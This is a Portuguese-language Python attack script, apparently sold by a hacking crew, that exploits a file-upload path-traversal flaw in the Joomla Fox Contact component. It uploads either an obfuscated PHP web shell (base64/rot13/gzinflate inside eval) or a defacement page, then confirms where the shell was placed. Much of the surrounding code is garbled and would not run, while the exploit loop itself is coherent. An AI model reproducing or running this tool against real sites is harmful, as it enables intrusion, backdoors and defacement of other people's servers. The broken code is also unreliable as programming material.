import os
import time 
from time import sleep as sleep
import subprocess
import colorama
from colorama import Fore as F
from multiprocessing import Process
import argparse
import sys


if sys.versão_info < (2,7):
    sys.stderr.write("Este script requer o Python 2.7 ou posterior.\n")
    sys.stderr.write("Versão Atual: " + sys.versão + "\n")
    sys.stderr.flush()
sys.exit(1)

nome = procname.setprocname('pma_upload.pyc')

arquivo = open(int="file" == filename, “mode”)

def tempo():
    import timeit as tempo 
     
    start = tempo.default_timer()
    stop = tempo.default_timer()
      total_tempo = stop - start 
        mins, secs = divmod(total_tempo, 60)
      horas, mins = divmod(mins, 60)
      sys.stdout.write("Total de tempo para uso do script %d:%d:%d.\n" % (horas, mins, secs))

      if __name__ == '__tempo__':
        	main()  

def terminar():

	 script = os.path.splitext(os.basename())[0]
       if(mins, secs, horas == 0):
	      os.path.isfile(Script)
          os.remove(Script)
     return mins, secs, horas

    processo = process.communicate(nome)[0]
     for processo in out.splitlines():
         pid = int(processo.split(None, 1)[0])
          os.kill(pid, signal.SIGKILL, nome)

      if __name__ == '__terminar__':
        	main()

def comandos():
	coman_parser = argparse.ArgumentParser(parents=[parent_parser])
       coman_parser.add_argument('--help', action="print", int="help")
             parser.print_help():
              help = """
use: pwm_upload.py --help #para ajudas
     pwm_upload.py -u [index] --l [lista] #scanear lista
     pwm_upload.py -u [index] --w [webiste] #dar upload 
         
causo erros nos avise para melhorarmos a compatibilidade
do script. 
              """
            return help; 
       coman_parser.add_argument('-u', action="file", int="upload")
          parser.upload(arquivo):
               print file.read() 
               if param.bypass:
	cid_bypass = "0"
else:
	cid_bypass = param.cid
joomla_diretorios = ["components/com_foxcontact/lib/file-uploader.php?cid={}&mid={}&qqfile=/../../_func.php".format(cid_bypass, param.cid), "index.php?option=com_foxcontact&view=loader&type=uploader&owner=component&id={}?cid={}&mid={}&qqfile=/../../_func.php".format(param.cid, cid_bypass, param.cid), "index.php?option=com_foxcontact&amp;view=loader&amp;type=uploader&amp;owner=module&amp;id={}&cid={}&mid={}&owner=module&id={}&qqfile=/../../_func.php".format(param.cid, cid_bypass, param.cid, param.cid), "components/com_foxcontact/lib/uploader.php?cid={}&mid={}&qqfile=/../../_func.php".format(cid_bypass, param.cid)]
shell = r"""<center>
<h5>Upload Form k0n1x</h5>
<?php eval (gzinflate(base64_decode(str_rot13("ML/EF8ZjRZnsUrk/hVMOJaQZS19pZ3kkVNtX06qEFgnxAct0bH2RGin/zljgT/c2q9
/iih+BI40TaSguWq98TXxc4k0pOiufqT+K7WvibboK8kxCfTyZ6IddrWcAV5mKhyANXlg0FkNPkJ2wTHUTrlQtoJHUjjyFGycunTqKtI8lnvzPLRJ
DT6ZEPUoIKJWkYyewYRFaJxt+epn6S0qs39+umDuTfsEJnSmd3HRWTkCv/WgX54K4g98833KBSUHXv/Ygqsr+k4USOENPRjxM/ZkaAk56eYDM0xJ5
sK552h1khNHKr2lIXpZOhYvSs2VHZh8O8oKbPibYUutxFLYKpCY2KCo8Y7ByDy6D0l8=")))); ?>
</center>"""
diretorios = 0
if param.index:
	joomla_diretorios = [letra.replace("/../../_func.php", "/../../../../index.php") for letra in joomla_diretorios]
	shell = """
<html>
<head>
	<meta charset="utf-8">
	<title>./yc.py</title>
	<link href="https://fonts.googleapis.com/css?family=Lato" rel="stylesheet">
</head>
<body bgcolor="white">
	<center><font size="5" face="Lato" color="black">Hackeado pela</font></center>
	<center><font size="10" face="Lato" color="black">Yunkers Crew</font></center>
	<center><font size="3" face="Lato" color="black">Supr3m0 passou aqui :/</font></center>
	<center><font size="3" face="Lato" color="black">Nois ta de volta, pra alegria dos hater haha</font></center>
	<center><img src="http://cdn5.colorir.com/desenhos/pintar/fantasma-classico_2.png" alt="Smiley face" height="250" width="400"></center>
	<center><font size="4" face="Lato" color="black">Somos: Supr3m0, W4r1o6k, V4por, F1r3Bl00d, Pr0sex & Cooldsec</font></center>
	<center><font size="4" face="Lato" color="black">Salve: Xin0x, R41d, Junin, M0nst4r & CryptonKing, Jonas sz</font></center>
	</br>
	<center><font size="5" face="Lato" color="black"><u>www.facebook.com/yunkers01/</u></font></center>
	<iframe width="1" height="1" src="https://www.youtube.com/embed/K4xl1T_lyiM?autoplay=1&controls=0&repeat=1" frameborder="0" allowfullscreen></iframe>
</body>
</html>
	"""

url = arruma(param.url)
try:
	for diretorio in joomla_diretorios:
		diretorios += 1
		url_vuln = url + diretorio
		shell_dir = url + "components/com_foxcontact/_func.php"
		checa_site = r.get(url_vuln, headers=user_agent)
		if '{"' in checa_site.text:
			print(F.GREEN + "\n[!] " + F.WHITE + " Inserindo payload no diretorio {}...".format(diretorios))
			envia_shell = r.post(url_vuln, data=shell, headers=user_agent)
			print(F.YELLOW + "[!] "+ F.WHITE + "Respondeu:")
			print(F.CYAN + envia_shell.text)
			verifica_shell = r.get(shell_dir, headers=user_agent)
			if verifica_shell.status_code != 404:
				print(F.GREEN + "\n[*]" + F.WHITE + " Shell enviada com sucesso!!!")
				print(F.GREEN + "[+]" + F.WHITE + " Local da shell: "+shell_dir)
				input("Aperte enter para continuar")
			else:
				print(F.RED + "[-] "+ F.WHITE + "Nao encontrei a shell: ", shell_dir)
		else:
			print(F.RED + "\n[-] " + F.WHITE + " Diretorio nao vulneravel: {}.".format(diretorios))
except Exception as iu:
	print(iu)
print(F.WHITE + "")
          return arquivo;

def banner(index):
	index = """
              _   _           _   _               
             | | | |         | | | |              
  _ __   ___ | |_| |__   ___ | |_| |__   ___ _ __ 
 | '_ \ / _ \| __| '_ \ / _ \| __| '_ \ / _ \ '__|
 | | | | (_) | |_| |_) | (_) | |_| | | |  __/ |   
 |_| |_|\___/ \__|_.__/ \___/ \__|_| |_|\___|_|  

 Script escrito em python produzido por raul e k0n1x
 usado para dar upload de index em websites sql vulls

 obs: ele tem um tempo limitado para uso, essa sera
 apenas uma versao para teste, causo queria comprar
 completo, contate-nos: (skype: live:r.wouty - gustavo.hacking)

 causo erros nos avise para melhorarmos a compatibilidade
 do script. 

 use: pwm_upload.py --help #para ajudas
      pwm_upload.py -u [index] --l [lista] #scanear lista
      pwm_upload.py -u [index] --w [webiste] #dar upload 
	"""
   if __name__ == '__banner__':
        	main()
